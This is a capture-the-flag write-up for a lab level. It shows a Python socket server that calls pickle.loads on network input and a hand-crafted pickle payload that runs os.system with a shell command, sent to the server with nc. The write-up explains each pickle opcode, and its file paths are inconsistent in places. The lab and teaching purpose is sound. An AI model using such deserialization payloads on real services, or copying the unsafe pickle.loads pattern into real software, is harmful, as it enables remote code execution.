Let's take a look at the source code...

```
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)
```

Here we can see that we have a python script, listening on port 10007. 

```
  obj = pickle.loads(line)
```

This here uses the vulnerable python function pickle. Pickle is a python Serialization (turning an object in memory into a stream of bytes, for storage or travelling over the network) and Deserialization fucntion  (turning a series of bytes into an object in memory).
The thing about Pickle is it works as a stack language, so it is possible to inject code into it and get remote code execution. Let's take a look at the code we will use.

```
cos
system
(S'getflag > /tmp/pwn'
tR.
```

The first two liness "cos" and "system" will load the pythond module os.system. This is done because the "c" reads the next object as a module, and the line after it as an object (which os is a module, and system is an object).
Moving on, the shell code will push the string "getflag > /home/level16/pwn" as a tuple (a tuple is a python list that cannot be changed) because the "(" signifies a marker object on the stack, and the "t" later on will pop everything up to the "(" off the stack and turn it into a tuple. The "S" signifies that the string in quotations will be pushed onto the stack.
Lastly, the "R" will pop the tuple and the callable (a callable is anything that can be called) off the stack, and call the callable (which in this case is o.system) with the tuple as the argument, and pushes the result onto the stack. Lastly the "." ends the pickle.

So let's try out this exploit.

```
$ cat /home/level17/exploit
cos
system
(S'getflag > tmp/pwn'
tR.
$ nc localhost 10007 < /home/level17/exploit
Accedpted connection from 127.0.0.1:60198^C
$ cat /tmp/pwn
You have successfully executed getflag on a target account
```

And just like that we pwned the script.
